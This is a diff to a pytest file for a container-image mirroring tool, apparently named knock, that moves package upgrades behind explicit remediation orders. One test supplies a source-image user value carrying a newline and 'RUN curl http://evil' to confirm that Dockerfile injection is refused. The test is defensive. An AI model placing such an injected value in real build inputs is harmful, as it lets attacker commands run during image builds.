@@ -7,6 +7,7 @@ import pytest
 
 from knock.adapters.local_archiver import LocalArchiver
 from knock.config import CACertSource, PackageMirror, RegistryConfig
+from knock.domain.gate import Gate, PlannedOperation, ReconcilePlan, RemediationOrder
 from knock.domain.mirror_policy import MirrorPolicy, parse_mirror_policy
 from knock.domain.transforms.base import ResolvedResource, ResolvedStep
 from knock.domain.transforms.render import transform_version
@@ -14,7 +15,7 @@ from knock.errors import ConfigError, PolicyValidationError, RegctlError
 from knock.ports.registry import ImageInfo
 from knock.use_cases.reconcile import reconcile_policies
 from knock.use_cases.reconcile_git import REVISION_TAG_PREFIX
-from knock.use_cases.reconcile_registry import to_mirror_artifact, to_source_artifact
+from knock.use_cases.reconcile_registry import Staging, to_mirror_artifact, to_source_artifact
 from knock.use_cases.report import RunReport
 from tests.fakes.attestor import FakeAttestor
 from tests.fakes.image_builder import FakeImageBuilder
@@ -785,81 +786,84 @@ def test_transformed_variant_skips_when_version_matches() -> None:
     assert builder.requests == []
 
 
-# --- upgradePackages and the source image's user (change: upgrade-packages-step) -----------
+# --- upgradePackages on order, and the source image's user (change: remediate-on-order) -----
 
 REPAIRED_SRC = "docker.io/library/redis"
 REPAIRED_DEST = "reg.local/repaired/redis"
+REPAIRED_STAGED = "stage.local/repaired/redis"
 REPAIRED_TAGS = ["7.2.4", "7.2.5", "7.2.6"]
-
-
-def _repaired_policy(epoch: str) -> MirrorPolicy:
-    return parse_mirror_policy(f"""
+REPAIRED_POLICY = parse_mirror_policy("""
 apiVersion: knock.io/v1alpha1
 kind: MirrorPolicy
-metadata: {{ name: redis-repaired }}
+metadata: { name: redis-repaired }
 spec:
   artifactType: image
-  source: {{ registry: docker.io, repository: library/redis }}
+  source: { registry: docker.io, repository: library/redis }
   imports:
     - name: v7
-      tags: {{ includeRegex: "^7\\\\.2\\\\." }}
+      tags: { includeRegex: "^7\\\\.2\\\\." }
       transform:
-        - rewritePackageSources: {{ mirror: corp }}
-        - upgradePackages: {{ epoch: "{epoch}" }}
-      destinations: [{{ project: repaired, repository: redis }}]
+        - rewritePackageSources: { mirror: corp }
+      remediate:
+        - upgradePackages: {}
+      destinations: [{ registry: local, project: repaired, repository: redis }]
 """)
+REPAIRED_ROSTER = {
+    "local": RegistryConfig(host="reg.local"),
+    "stage": RegistryConfig(host="stage.local"),
+}
 
 
-def _repaired_version(epoch: str) -> str:
-    steps = _repaired_policy(epoch).spec.imports[0].transform
+def _repaired_version() -> str:
+    """The transform version: the transform alone, whatever the remediation."""
+    steps = REPAIRED_POLICY.spec.imports[0].transform
     assert steps is not None
     return transform_version(
         [
             ResolvedStep(
                 steps[0],
                 (ResolvedResource(kind="packageMirror", name="corp", apt="https://mirror.corp"),),
-            ),
-            ResolvedStep(steps[1], ()),
+            )
         ]
     )
 
 
-def _repaired_registry(*, placed_epoch: str | None, user: str = "") -> FakeRegistryPort:
+def _repaired_registry(
+    *, placed: bool = False, remediated: bool = False, user: str = "", version: str | None = None
+) -> FakeRegistryPort:
     infos = {
         f"{REPAIRED_SRC}:{t}": ImageInfo(
             digest=f"sha256:src-{t}", created=HARDENED_NOW, annotations={}, user=user
         )
         for t in REPAIRED_TAGS
     }
-    if placed_epoch is not None:
+    if placed:
         for t in REPAIRED_TAGS:
+            stamp = {
+                "org.opencontainers.image.base.digest": f"sha256:src-{t}",
+                "io.knock.transform.version": version or _repaired_version(),
+            }
+            if remediated:
+                stamp["io.knock.remediation.steps"] = "upgradePackages"
+                stamp["io.knock.remediation.epoch"] = "2026-10-10"
             infos[f"{REPAIRED_DEST}:{t}"] = ImageInfo(
-                digest=f"sha256:built-{t}",
-                created=HARDENED_NOW,
-                annotations={
-                    "org.opencontainers.image.base.digest": f"sha256:src-{t}",
-                    "io.knock.transform.version": _repaired_version(placed_epoch),
-                },
+                digest=f"sha256:built-{t}", created=HARDENED_NOW, annotations=stamp
             )
     return FakeRegistryPort(
-        tags={
-            REPAIRED_SRC: REPAIRED_TAGS,
-            REPAIRED_DEST: REPAIRED_TAGS if placed_epoch is not None else [],
-        },
+        tags={REPAIRED_SRC: REPAIRED_TAGS, REPAIRED_DEST: REPAIRED_TAGS if placed else []},
         infos=infos,
     )
 
 
-def _run_repaired(
-    registry: FakeRegistryPort, builder: FakeImageBuilder, epoch: str = "2026-10-10"
+def _repaired_run(
+    registry: FakeRegistryPort, builder: FakeImageBuilder, **over: object
 ) -> RunReport:
-    return reconcile_policies(  # type: ignore[call-arg]
-        [_repaired_policy(epoch)],
+    kwargs: dict[str, object] = dict(
         registry=registry,
         builder=builder,
         source=FakeSourcePort(),
         archiver=LocalArchiver(),
-        roster={"local": RegistryConfig(host="reg.local")},
+        roster=REPAIRED_ROSTER,
         ca_certs={},
         package_mirrors={"corp": PackageMirror(apt="https://mirror.corp")},
         build_platform="linux/amd64",
@@ -869,52 +873,79 @@ def _run_repaired(
         dry_run_deletions=False,
         reporter=FakeReporter(),
     )
+    kwargs.update(over)
+    return reconcile_policies([REPAIRED_POLICY], **kwargs)  # type: ignore[arg-type]
 
 
-def test_upgrade_packages_builds_every_selected_tag_and_stamps_the_step() -> None:
-    registry = _repaired_registry(placed_epoch=None)
-    builder = FakeImageBuilder()
-    report = _run_repaired(registry, builder)
+def _plan(registry: FakeRegistryPort) -> list[PlannedOperation]:
+    recording = Gate()
+    _repaired_run(
+        registry, FakeImageBuilder(), gate=recording, dry_run_tags=True, dry_run_deletions=True
+    )
+    return recording.planned
 
-    assert report.totals.imported == 3
-    assert len(builder.requests) == 3
+
+def _run_ordered(
+    registry: FakeRegistryPort, builder: FakeImageBuilder, epoch: str = "2026-10-10"
+) -> tuple[RunReport, Staging]:
+    ops = [
+        op.model_copy(update={"remediate": RemediationOrder(epoch=epoch)}) for op in _plan(registry)
+    ]
+    staging = Staging(config=REPAIRED_ROSTER["stage"])
+    report = _repaired_run(
+        registry, builder, gate=Gate.from_plan(ReconcilePlan(operations=ops)), staging=staging
+    )
+    return report, staging
+
+
+def test_an_order_upgrades_every_ordered_tag_and_stamps_the_remediation_apart() -> None:
+    registry, builder = _repaired_registry(), FakeImageBuilder()
+    report, staging = _run_ordered(registry, builder)
+
+    assert report.totals.staged == 3 and len(builder.requests) == 3
     for df in builder.dockerfiles:
         assert df.index("/etc/apt/sources.list") < df.index("knock-upgrade-epoch=2026-10-10")
         assert "USER" not in df  # a root source renders no USER line
     _ref, ann = registry.annotated[0]
-    assert ann["io.knock.transform.steps"] == "rewritePackageSources,upgradePackages"
-    assert ann["io.knock.transform.version"] == _repaired_version("2026-10-10")
+    assert ann["io.knock.transform.steps"] == "rewritePackageSources"
+    assert ann["io.knock.transform.version"] == _repaired_version()
+    assert ann["io.knock.remediation.steps"] == "upgradePackages"
+    assert ann["io.knock.remediation.epoch"] == "2026-10-10"
+    assert {e.epoch for e in staging.entries} == {"2026-10-10"}
 
 
-def test_a_new_epoch_rebuilds_every_selected_tag() -> None:
-    # The operator's trigger: nothing moved upstream, only the epoch in the policy.
-    registry = _repaired_registry(placed_epoch="2026-10-10")
-    builder = FakeImageBuilder()
-    report = _run_repaired(registry, builder, epoch="2026-10-17")
+def test_without_an_order_the_remediation_is_not_applied() -> None:
+    registry, builder = _repaired_registry(), FakeImageBuilder()
+    report = _repaired_run(registry, builder)
 
-    assert report.totals.updated == 3 and report.totals.imported == 0
-    assert sorted(r.image_ref for r in builder.requests) == [
-        f"{REPAIRED_DEST}:{t}" for t in REPAIRED_TAGS
-    ]
-    assert all("knock-upgrade-epoch=2026-10-17" in df for df in builder.dockerfiles)
+    assert report.totals.imported == 3
+    assert all("knock-upgrade-epoch" not in df for df in builder.dockerfiles)
+    assert all("io.knock.remediation.epoch" not in ann for _r, ann in registry.annotated)
 
 
-def test_the_same_epoch_keeps_every_tag() -> None:
-    registry = _repaired_registry(placed_epoch="2026-10-10")
-    builder = FakeImageBuilder()
-    report = _run_repaired(registry, builder, epoch="2026-10-10")
+def test_a_remediated_tag_is_kept_by_the_next_pass() -> None:
+    # Drift is computed on the transform alone: the next pass must not undo the repair.
+    registry, builder = _repaired_registry(placed=True, remediated=True), FakeImageBuilder()
+    report = _repaired_run(registry, builder)
 
     assert report.totals.updated == 0 and report.totals.imported == 0
     assert builder.requests == []
 
 
-def test_a_failed_upgrade_build_fails_the_operation_and_places_nothing() -> None:
-    # What a `RUN … exit 1` (no apt, no apk) or an unreachable mirror looks like from here.
-    registry = _repaired_registry(placed_epoch=None)
-    report = _run_repaired(registry, FakeImageBuilder(fail=True))
+def test_a_rebuild_of_a_remediated_tag_says_so_in_the_plan() -> None:
+    registry = _repaired_registry(placed=True, remediated=True, version="sha256:old-transform")
+    ops = _plan(registry)
+    assert {(op.kind, op.remediated) for op in ops} == {("rebuild", True)}
+    assert all(op.remediate is None for op in ops)  # --plan-out never writes an order
 
-    assert report.totals.imported == 0 and report.totals.failed == 3
-    assert registry.annotated == [] and registry.copied == []
+
+def test_a_failed_upgrade_build_fails_the_operation_and_stages_nothing() -> None:
+    # What a `RUN … exit 1` (no apt, no apk) or an unreachable mirror looks like from here.
+    registry = _repaired_registry()
+    report, staging = _run_ordered(registry, FakeImageBuilder(fail=True))
+
+    assert report.totals.staged == 0 and report.totals.failed == 3
+    assert registry.annotated == [] and staging.entries == []
     ops = [op for t in report.policies[0].targets for v in t.variants for op in v.operations]
     failed = [op for op in ops if op.error is not None]
     assert {op.error.type for op in failed} == {"BuildkitError"}  # type: ignore[union-attr]
@@ -922,9 +953,8 @@ def test_a_failed_upgrade_build_fails_the_operation_and_places_nothing() -> None
 
 
 def test_a_non_root_source_is_rebuilt_as_root_and_restored() -> None:
-    registry = _repaired_registry(placed_epoch=None, user="app")
-    builder = FakeImageBuilder()
-    _run_repaired(registry, builder)
+    registry, builder = _repaired_registry(user="app"), FakeImageBuilder()
+    _run_ordered(registry, builder)
 
     for df in builder.dockerfiles:
         lines = df.splitlines()
@@ -933,9 +963,8 @@ def test_a_non_root_source_is_rebuilt_as_root_and_restored() -> None:
 
 
 def test_an_unsafe_source_user_fails_the_operation_before_any_build() -> None:
-    registry = _repaired_registry(placed_epoch=None, user="app\nRUN curl http://evil")
-    builder = FakeImageBuilder()
-    report = _run_repaired(registry, builder)
+    registry, builder = _repaired_registry(user="app\nRUN curl http://evil"), FakeImageBuilder()
+    report, _staging = _run_ordered(registry, builder)
 
     assert builder.requests == []
     assert registry.annotated == []
